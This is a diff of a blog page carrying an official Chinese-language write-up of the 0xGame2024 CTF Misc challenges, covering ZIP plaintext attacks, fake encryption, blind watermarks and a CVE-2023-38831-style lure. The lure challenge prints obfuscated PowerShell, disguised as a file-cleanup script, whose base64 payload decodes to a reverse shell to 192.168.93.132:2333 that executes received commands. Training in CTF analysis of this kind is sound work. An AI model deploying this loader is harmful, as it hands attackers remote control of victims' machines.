@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>0xGame2024 Misc Official Writeup | St4rr's Blog</title><meta name="author" content="St4rr"><meta name="copyright" content="St4rr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="其中打*的是我出的题  Misc 0xGame2048* 提取一下题目中的关键词&quot;2048&quot;、&quot;base&quot;搜索一下，其实不难找到一种叫做base2048的编码。解密的方法有很多，我这里用的是toolsfx。   img  一明一暗* 这道题在出题时使用的是Bandizip 7.36，默认使用了快速压缩的方法。然而很多师傅的Bandizip默认的是正常压缩，因而在做题时出现">
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>0xGame2024 Misc Official Writeup | St4rr's Blog</title><meta name="author" content="St4rr"><meta name="copyright" content="St4rr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="其中打*的是我出的题  Misc0xGame2048*提取一下题目中的关键词”2048”、”base”搜索一下，其实不难找到一种叫做base2048的编码。解密的方法有很多，我这里用的是toolsfx。  一明一暗*这道题在出题时使用的是Bandizip 7.36，默认使用了快速压缩的方法。然而很多师傅的Bandizip默认的是正常压缩，因而在做题时出现了无法执行攻击的问题，这里不是出题人本意o">
 <meta property="og:type" content="article">
 <meta property="og:title" content="0xGame2024 Misc Official Writeup">
 <meta property="og:url" content="https://www.blog.st4rr.top/posts/511d172f/index.html">
 <meta property="og:site_name" content="St4rr&#39;s Blog">
-<meta property="og:description" content="其中打*的是我出的题  Misc 0xGame2048* 提取一下题目中的关键词&quot;2048&quot;、&quot;base&quot;搜索一下，其实不难找到一种叫做base2048的编码。解密的方法有很多，我这里用的是toolsfx。   img  一明一暗* 这道题在出题时使用的是Bandizip 7.36，默认使用了快速压缩的方法。然而很多师傅的Bandizip默认的是正常压缩，因而在做题时出现">
+<meta property="og:description" content="其中打*的是我出的题  Misc0xGame2048*提取一下题目中的关键词”2048”、”base”搜索一下，其实不难找到一种叫做base2048的编码。解密的方法有很多，我这里用的是toolsfx。  一明一暗*这道题在出题时使用的是Bandizip 7.36，默认使用了快速压缩的方法。然而很多师傅的Bandizip默认的是正常压缩，因而在做题时出现了无法执行攻击的问题，这里不是出题人本意o">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://www.blog.st4rr.top/img/grey_bwm.png">
 <meta property="article:published_time" content="2024-11-11T07:16:58.000Z">
@@ -162,888 +162,359 @@
         }
       }
       detectApple()
-    })(window)</script><meta name="generator" content="Hexo 7.1.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/grey_bwm.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">54</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> archives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> Comment</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/starry.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="St4rr's Blog"><span class="site-name">St4rr's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> archives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> Comment</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">0xGame2024 Misc Official Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-11-11T07:16:58.000Z" title="Created 2024-11-11 15:16:58">2024-11-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-03-19T07:33:54.847Z" title="Updated 2025-03-19 15:33:54">2025-03-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">8.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>35mins</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/511d172f/" data-flag-title="0xGame2024 Misc Official Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/posts/511d172f/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/511d172f/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+    })(window)</script><meta name="generator" content="Hexo 7.1.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/grey_bwm.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">54</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> archives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> Comment</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/starry.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="St4rr's Blog"><span class="site-name">St4rr's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> archives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> Comment</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">0xGame2024 Misc Official Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-11-11T07:16:58.000Z" title="Created 2024-11-11 15:16:58">2024-11-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-03-19T07:33:54.847Z" title="Updated 2025-03-19 15:33:54">2025-03-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">8.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>35mins</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/511d172f/" data-flag-title="0xGame2024 Misc Official Writeup"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/posts/511d172f/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/511d172f/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
 <p>其中打*的是我出的题</p>
 </blockquote>
-<h2 id="misc">Misc</h2>
-<h3 id="xgame2048">0xGame2048*</h3>
-<p>提取一下题目中的关键词"2048"、"base"搜索一下，其实不难找到一种叫做base2048的编码。解密的方法有很多，我这里用的是toolsfx。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912622916-03061021-430b-4491-9ff6-b88909cd2313.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h3 id="一明一暗">一明一暗*</h3>
-<p>这道题在出题时使用的是Bandizip
-7.36，默认使用了快速压缩的方法。然而很多师傅的Bandizip默认的是正常压缩，因而在做题时出现了无法执行攻击的问题，这里不是出题人本意o(╥﹏╥)o，出题时并没有想过在这里设置门槛，给师傅们磕一个了。Orz</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="0xGame2048"><a href="#0xGame2048" class="headerlink" title="0xGame2048*"></a>0xGame2048*</h3><p>提取一下题目中的关键词”2048”、”base”搜索一下，其实不难找到一种叫做base2048的编码。解密的方法有很多，我这里用的是toolsfx。</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912622916-03061021-430b-4491-9ff6-b88909cd2313.png" alt="img"></p>
+<h3 id="一明一暗"><a href="#一明一暗" class="headerlink" title="一明一暗*"></a>一明一暗*</h3><p>这道题在出题时使用的是Bandizip 7.36，默认使用了快速压缩的方法。然而很多师傅的Bandizip默认的是正常压缩，因而在做题时出现了无法执行攻击的问题，这里不是出题人本意o(╥﹏╥)o，出题时并没有想过在这里设置门槛，给师傅们磕一个了。Orz</p>
 <p>然而仍然有很多厉害的师傅通过各种方法解出来了，比如挨个尝试各种压缩方法、通过文件大小判断正确的压缩方法、以及直接从attachment.zip中抽去1.zip使其成为一个明文包（膜拜），因此也就没有修改题目。</p>
 <p>接下来说一下预期解。</p>
 <p>首先将得到的f1ag.jpg压缩成一个明文包，然后使用ARCHPR执行明文攻击。明文攻击时用不着等这个进度条全部走完，只需要到如下状态就可以直接点停止，保存下来的zip文件就是已经解密好的。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912622997-0f54f3e8-18f9-41cb-9e61-33ff855d4e70.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912622997-0f54f3e8-18f9-41cb-9e61-33ff855d4e70.png" alt="img"></p>
 <p>根据hint.txt的内容可以得知这是一个盲水印，可以在网上找到这样一个工具，直接对flag.png提取就行。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912622960-e9c19936-d8bd-4e81-9b42-76cb973c1488.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912623024-5f16fd12-1eb9-4319-a296-a1b952a611a7.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h3 id="加密的压缩包">加密的压缩包？</h3>
-<p>用010editor查看，压缩包末尾给了一个password，可知这个压缩包原本应该是被加密了的。但是从加密标识位（下图选中部分）来看，这里是被设置成了未加密，因此这里其实是个伪不加密。</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912623005-978bd4db-fcff-4198-b5a7-417be0fbf4b8.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912624583-1db33a15-a6d4-4219-8c9d-9f2e4c532379.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912622960-e9c19936-d8bd-4e81-9b42-76cb973c1488.png" alt="img"></p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912623024-5f16fd12-1eb9-4319-a296-a1b952a611a7.png" alt="img"></p>
+<h3 id="加密的压缩包？"><a href="#加密的压缩包？" class="headerlink" title="加密的压缩包？"></a>加密的压缩包？</h3><p>用010editor查看，压缩包末尾给了一个password，可知这个压缩包原本应该是被加密了的。但是从加密标识位（下图选中部分）来看，这里是被设置成了未加密，因此这里其实是个伪不加密。</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912623005-978bd4db-fcff-4198-b5a7-417be0fbf4b8.png" alt="img"></p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624583-1db33a15-a6d4-4219-8c9d-9f2e4c532379.png" alt="img"></p>
 <p>将加密位改为09以后保存，输入密码0xGame2024即可解压</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912624629-9d5cbb81-7a05-4571-bc87-600f74274f37.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912624616-b7537c66-a4af-4b79-a4eb-33a673bc544b.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<h3 id="我的世界基岩版">我的世界基岩版(?*</h3>
-<p>先说一下预期解：</p>
-<p>下载地图模组xaero's minimap和xaero's
-worldmap即可大概看到flag的轮廓，就是地上的那些基岩组成的字。接下来就是实地考察一下+尝试，可以得到flag是0xGame{MC_SErver_4_CTFers}</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1728912624631-d9a0ec8e-69aa-449c-97c9-63c33a005235.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624629-9d5cbb81-7a05-4571-bc87-600f74274f37.png" alt="img"></p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624616-b7537c66-a4af-4b79-a4eb-33a673bc544b.png" alt="img"></p>
+<h3 id="我的世界基岩版"><a href="#我的世界基岩版" class="headerlink" title="我的世界基岩版(?*"></a>我的世界基岩版(?*</h3><p>先说一下预期解：</p>
+<p>下载地图模组xaero’s minimap和xaero’s worldmap即可大概看到flag的轮廓，就是地上的那些基岩组成的字。接下来就是实地考察一下+尝试，可以得到flag是0xGame{MC_SErver_4_CTFers}</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1728912624631-d9a0ec8e-69aa-449c-97c9-63c33a005235.png" alt="img"></p>
 <p>此外还有很多方法也都在预期之内，比如向上搭天梯看、使用tweakeroo模组直接灵魂出窍飞起来看、或者直接开各种各样的外挂都行。</p>
-<p>服务器开出来一段时间后，有师傅搭建并维护了出生点物资领取处、天路、铁轨等造福后来的师傅（辛苦了）。但也有一些调皮的师傅，到处插告示牌在上面留假flag或者做假引导，出题人都在发现的第一时间进行了拆除。所以不要再拷打出题人了，那真的不是题目的一部分o(╥﹏╥)o
-:(</p>
-<h3 id="呜呜呜我再也不敢乱点了">呜呜呜~我再也不敢乱点了*</h3>
-<p>灵感来源于CVE-2023-38831，当时看到感觉挺有意思的，就当成题出了</p>
+<p>服务器开出来一段时间后，有师傅搭建并维护了出生点物资领取处、天路、铁轨等造福后来的师傅（辛苦了）。但也有一些调皮的师傅，到处插告示牌在上面留假flag或者做假引导，出题人都在发现的第一时间进行了拆除。所以不要再拷打出题人了，那真的不是题目的一部分o(╥﹏╥)o :(</p>
+<h3 id="呜呜呜-我再也不敢乱点了"><a href="#呜呜呜-我再也不敢乱点了" class="headerlink" title="呜呜呜~我再也不敢乱点了*"></a>呜呜呜~我再也不敢乱点了*</h3><p>灵感来源于CVE-2023-38831，当时看到感觉挺有意思的，就当成题出了</p>
 <p>不过从解题来说知不知道这个CVE影响其实不大，感兴趣的可以了解一下</p>
-<p>题目附件给了一个 <code>somethingGOOD.pcapng</code>
-和一个<code>what_is_this.log</code>，打开流量包可以看到是TLS1.3协议的流量：</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496036561-30c65c77-4951-49ca-9e26-ebd61908ddae.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>查阅资料可知可以用 <code>key log</code>
-文件，也就是<code>what_is_this.log</code>来解密TLS流量，在wireshark中的
-<code>编辑-&gt;首选项-&gt;协议</code> 里找到TLS：</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496036668-894ee1a9-1641-448f-b719-bbd2bab0a8c0.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>之后就能看到http协议传输的 <code>wuyu.zip</code>，可以在
-<code>文件-&gt;导出对象-&gt;HTTP</code>
-中提取出来并解压，可以看到<code>introduction.txt</code>目录下有两个可疑文件，<code>clean_file_rubbish.ps1</code>
-以及 <code>introduction.txt .bat</code></p>
-<p>可以先对 <code>introduction.txt .bat</code>
-进行分析，里面大部分是注释，真正执行的是当前目录下的ps1脚本文件：</p>
-<figure>
-<img
-src="/images/0xGame2024-Misc-Official-Writeup/1729496036684-ddc2aca5-d1ae-4803-a1f3-3d10036c15c9.png"
-alt="img" />
-<figcaption aria-hidden="true">img</figcaption>
-</figure>
-<p>于是可以继续分析 <code>clean_file_rubbish.ps1</code>
-，表面上是一个清理文件的功能，但同样这些代码都是被注释掉的，往下拖拉可以看到真正被混淆的powershell代码：</p>
+<p>题目附件给了一个 <code>somethingGOOD.pcapng</code> 和一个<code>what_is_this.log</code>，打开流量包可以看到是TLS1.3协议的流量：</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036561-30c65c77-4951-49ca-9e26-ebd61908ddae.png" alt="img"></p>
+<p>查阅资料可知可以用 <code>key log</code> 文件，也就是<code>what_is_this.log</code>来解密TLS流量，在wireshark中的 <code>编辑-&gt;首选项-&gt;协议</code> 里找到TLS：</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036668-894ee1a9-1641-448f-b719-bbd2bab0a8c0.png" alt="img"></p>
+<p>之后就能看到http协议传输的 <code>wuyu.zip</code>，可以在 <code>文件-&gt;导出对象-&gt;HTTP</code> 中提取出来并解压，可以看到<code>introduction.txt </code>目录下有两个可疑文件，<code>clean_file_rubbish.ps1</code> 以及 <code>introduction.txt .bat</code></p>
+<p>可以先对 <code>introduction.txt .bat</code> 进行分析，里面大部分是注释，真正执行的是当前目录下的ps1脚本文件：</p>
+<p><img src="/images/0xGame2024-Misc-Official-Writeup/1729496036684-ddc2aca5-d1ae-4803-a1f3-3d10036c15c9.png" alt="img"></p>
+<p>于是可以继续分析 <code>clean_file_rubbish.ps1</code> ，表面上是一个清理文件的功能，但同样这些代码都是被注释掉的，往下拖拉可以看到真正被混淆的powershell代码：</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># just some unordered and garbled characters</span></span><br><span class="line"><span class="variable">$Cx99zNP0yc8btz1DgdjQ4d6Or1WXvNo8ujcqwFC3kgHFE9zERLRSUflsWbCwFagZeNLAt8td0BUZr85MNnhsIJtjt4781b120rrHzFZmMsUAPcAS4tHCiJx9Vst4SWWeSBn8IkFD6e4O6bMfzboKxPZiplfSpAXYD1iHJbuWsDciLYdqfa9TcbYHOWxeR91cFzmnKRYSFU573fAKQqZMCsiaLB2ZMGMlIbshBlb94PHljepzqNuqEo2uRQ0Pg4hLsKE7D4cXoCXuDAUwHPVQm3Jz6KQcfUWAlvGzhQKyzLBXGta8LH6Ua0yL8nFCPU4O3uIh58sIpSPEdxO4HkYZfKSF9ta6hrN2o8YWfbRMIdMHNNgywFv3YVlCzwKWP3suJq7yHHl0O0MW7dtk2t05bteVH0k4O0HOfKLQ4wDPrnwu5Q1d7L6JLvNEC9dAtXx56ACbzCHQMt8ZIaxZeLxWMnB7Q34pe0bmoO1hPZtiRENA4Scp1Gsm</span> = <span class="string">&quot;JExIT1NUID0gIjE5Mi4xNjguOTMuMTMyIjsgJExQT1JUID0gMjMzMzsgJFRDUENsaWVudCA9IE5ldy1PYmplY3QgTmV0LlNvY2tldHMuVENQQ2xpZW50KCRMSE9TVCwgJExQT1JUKTsgJE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyAkU3RyZWFtUmVhZGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pOyAkU3RyZWFtV3JpdGVyLkF1dG9GbHVzaCA9ICR0cnVlOyAkQnVmZmVyID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdIDEwMjQ7IHdoaWxlICgkVENQQ2xpZW50LkNvbm5lY3RlZCkgeyB3aGlsZSAoJE5ldHdvcmtTdHJlYW0uRGF0YUF2YWlsYWJsZSkgeyAkUmF3RGF0YSA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpOyAkQ29kZSA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkUmF3RGF0YSAtMSkgfTsgaWYgKCRUQ1BDbGllbnQuQ29ubmVjdGVkIC1hbmQgJENvZGUuTGVuZ3RoIC1ndCAxKSB7ICRPdXRwdXQgPSB0cnkgeyBJbnZva2UtRXhwcmVzc2lvbiAoJENvZGUpIDI+JjEgfSBjYXRjaCB7ICRfIH07ICRTdHJlYW1Xcml0ZXIuV3JpdGUoIiRPdXRwdXRgbiIpOyAkQ29kZSA9ICRudWxsIH0gfTsgJFRDUENsaWVudC5DbG9zZSgpOyAkTmV0d29ya1N0cmVhbS5DbG9zZSgpOyAkU3RyZWFtUmVhZGVyLkNsb3NlKCk7ICRTdHJlYW1Xcml0ZXIuQ2xvc2UoKQ==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t think too much</span></span><br><span class="line"><span class="variable">$SsuhfRO1wgyokMOlaEmBBcAzcInXG54WdHo9eVpNI9Xhb0kluCXXz5hxYS7pzUgJOfnpV8ZkPMhHNCtTMkSg1Sj32zonCoq4qXXfBsmASttQtGic0mBErHBYS6ROmJohHmnHTYa2ijVwYv8vfzgFLW6rPkY1LpsEVrbfCqc6QFCdo3mzQIkyU1pbPKuH2IDPbkYshWZYoiLxtYBdsGa6ZtvZ8WpbYhmHEcXG4RGhhoLPTnTITmSZJ7rm24GYws75qN4ZOH4Wf9IBSHuRLtOmGVi23anihNphBV8IkTmT6vhChsJwC6HY1zTN4lbA4wmdtEjhSyEF3pY2XLm8RTzIZAkoAiKvzD7V1rLdMa5nUo0c2eDe9wpnJ1qWhOy1GuVYMFI09bVegrdWHlQ4np4GWDAlc8FJhzM6gzRHwbklJmLtPcwm1MFf0vlh9lLqLpMdS586AnnBMuJezW6Tpmta4O5HaDxLsb3S8l3wTxCjoad1BdqAoZa1</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$Cx99zNP0yc8btz1DgdjQ4d6Or1WXvNo8ujcqwFC3kgHFE9zERLRSUflsWbCwFagZeNLAt8td0BUZr85MNnhsIJtjt4781b120rrHzFZmMsUAPcAS4tHCiJx9Vst4SWWeSBn8IkFD6e4O6bMfzboKxPZiplfSpAXYD1iHJbuWsDciLYdqfa9TcbYHOWxeR91cFzmnKRYSFU573fAKQqZMCsiaLB2ZMGMlIbshBlb94PHljepzqNuqEo2uRQ0Pg4hLsKE7D4cXoCXuDAUwHPVQm3Jz6KQcfUWAlvGzhQKyzLBXGta8LH6Ua0yL8nFCPU4O3uIh58sIpSPEdxO4HkYZfKSF9ta6hrN2o8YWfbRMIdMHNNgywFv3YVlCzwKWP3suJq7yHHl0O0MW7dtk2t05bteVH0k4O0HOfKLQ4wDPrnwu5Q1d7L6JLvNEC9dAtXx56ACbzCHQMt8ZIaxZeLxWMnB7Q34pe0bmoO1hPZtiRENA4Scp1Gsm</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># If you don’t believe it, you can try it</span></span><br><span class="line"><span class="built_in">Invoke-Expression</span> <span class="variable">$SsuhfRO1wgyokMOlaEmBBcAzcInXG54WdHo9eVpNI9Xhb0kluCXXz5hxYS7pzUgJOfnpV8ZkPMhHNCtTMkSg1Sj32zonCoq4qXXfBsmASttQtGic0mBErHBYS6ROmJohHmnHTYa2ijVwYv8vfzgFLW6rPkY1LpsEVrbfCqc6QFCdo3mzQIkyU1pbPKuH2IDPbkYshWZYoiLxtYBdsGa6ZtvZ8WpbYhmHEcXG4RGhhoLPTnTITmSZJ7rm24GYws75qN4ZOH4Wf9IBSHuRLtOmGVi23anihNphBV8IkTmT6vhChsJwC6HY1zTN4lbA4wmdtEjhSyEF3pY2XLm8RTzIZAkoAiKvzD7V1rLdMa5nUo0c2eDe9wpnJ1qWhOy1GuVYMFI09bVegrdWHlQ4np4GWDAlc8FJhzM6gzRHwbklJmLtPcwm1MFf0vlh9lLqLpMdS586AnnBMuJezW6Tpmta4O5HaDxLsb3S8l3wTxCjoad1BdqAoZa1</span></span><br></pre></td></tr></table></figure>
+
